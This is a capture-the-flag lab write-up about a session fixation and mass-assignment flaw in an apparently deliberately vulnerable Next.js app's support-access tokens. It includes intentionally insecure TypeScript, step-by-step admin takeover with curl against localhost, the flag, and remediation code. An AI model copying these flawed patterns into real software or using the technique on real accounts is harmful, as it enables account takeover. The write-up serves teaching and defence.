# Session Fixation & Weak Session Management Vulnerability

## Overview

This vulnerability demonstrates critical flaws in session management, specifically a session fixation attack combined with weak JWT token lifecycle management. The application allows users to generate "support access tokens" to grant customer support temporary access to their accounts, but a mass assignment flaw allows attackers to generate tokens for arbitrary users.

## Feature Description

The "Support Access" feature is accessible from the user profile page. It allows users to:

1. Generate a support access token for their account
2. Share the token URL with customer support
3. Revoke the token when support is no longer needed

This is a legitimate feature commonly found in SaaS applications to allow support teams to troubleshoot user issues.

## Vulnerability Summary

The vulnerability stems from multiple security weaknesses:

1. **Session Fixation via Mass Assignment**: The token generation endpoint accepts an `email` parameter in the request body. If provided, it generates a token for that email instead of the authenticated user's email.

2. **Excessive Token Lifetime**: Support tokens are valid for 365 days, far exceeding what would be needed for a support session.

3. **Ineffective Token Revocation**: The "revoke" functionality only marks the token as revoked in the database but doesn't actually prevent its use (no blacklist check during authentication).

4. **No Rate Limiting**: Attackers can generate unlimited tokens for any user.

### Vulnerable Code

**Token Generation Endpoint (app/api/user/support-access/route.ts):**

```typescript
export async function POST(request: NextRequest) {
  const user = await getAuthenticatedUser(request);

  if (!user) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await request.json().catch(() => ({}));

  // VULNERABILITY: Accepts email from request body without validation
  const targetEmail = body.email || user.email;

  const targetUser = await prisma.user.findUnique({
    where: { email: targetEmail },
    // ...
  });

  // Creates token for targetUser, not necessarily the authenticated user
  const supportToken = await prisma.supportAccessToken.create({
    data: {
      token,
      userId: targetUser.id,
      email: targetUser.email,
      expiresAt, // 365 days from now
    },
  });
}
```

**Support Login Endpoint (app/api/auth/support-login/route.ts):**

```typescript
export async function GET(request: NextRequest) {
  const token = searchParams.get("token");

  const supportToken = await prisma.supportAccessToken.findUnique({
    where: { token },
    // Note: Does NOT check if token is revoked!
  });

  if (supportToken.expiresAt < new Date()) {
    return NextResponse.json({ error: "Token expired" }, { status: 401 });
  }

  // Creates a full session for the user
  const authToken = createWeakJWT({
    id: supportToken.user.id,
    email: supportToken.user.email,
    role: supportToken.user.role,
    supportAccess: true, // Marks this as a support access session
  });
}
```

## Impact

This vulnerability allows attackers to:

- **Account Takeover**: Generate support tokens for any user, including administrators
- **Privilege Escalation**: Access admin functionality by generating a token for admin accounts
- **Persistent Access**: Maintain access for up to 365 days
- **Bypass Revocation**: Continue using tokens even after they are "revoked"

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{s3ss10n_f1x4t10n_4tt4ck}`, follow these steps:

1. **Create a Regular Account**: Sign up for a normal user account
2. **Navigate to Support Access**: Go to Profile → Support Access tab
3. **Intercept the Token Generation Request**: When clicking "Generate Support Access Token", intercept the POST request to `/api/user/support-access`
4. **Modify the Request Body**: Add the admin email to the request:
   ```json
   {
     "email": "admin@oss.com"
   }
   ```
5. **Use the Generated Token**: The response will contain a support token for the admin account
6. **Access the Support Login URL**: Navigate to `/support-login?token=<generated_token>`
7. **Access Admin Resources**: You are now logged in as admin via support access
8. **View the Flag**: Navigate to `/admin` - the flag will be displayed on the admin dashboard because the system detects unauthorized support access to the admin account

### Alternative Exploitation Path

You can also exploit this using curl:

```bash
# Login as regular user first to get auth token
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"iloveduck"}'

# Generate support token for admin (session fixation)
curl -X POST http://localhost:3000/api/user/support-access \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your_auth_token>" \
  -d '{"email":"admin@oss.com"}'

# Use the support token to access admin
# Navigate to the returned supportLoginUrl in browser

# Then navigate to /admin - the flag will be displayed on the dashboard
```

## Remediation

### Immediate Actions

1. **Remove Mass Assignment**: Never accept user-controlled input for determining which account to act upon:

   ```typescript
   const targetEmail = user.email; // Always use authenticated user's email
   ```

2. **Reduce Token Lifetime**: Use short-lived tokens (hours, not days):

   ```typescript
   const TOKEN_EXPIRY_HOURS = 12;
   expiresAt.setHours(expiresAt.getHours() + TOKEN_EXPIRY_HOURS);
   ```

3. **Implement Proper Revocation**: Check revocation status during token validation:

   ```typescript
   if (supportToken.revoked) {
     return NextResponse.json({ error: "Token revoked" }, { status: 401 });
   }
   ```

4. **Add Rate Limiting**: Limit token generation to prevent abuse

5. **Require Re-authentication**: For sensitive actions like generating support tokens, require password confirmation

6. **Audit Logging**: Log all support access token usage for security monitoring

## References

- [OWASP Top 10 - Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
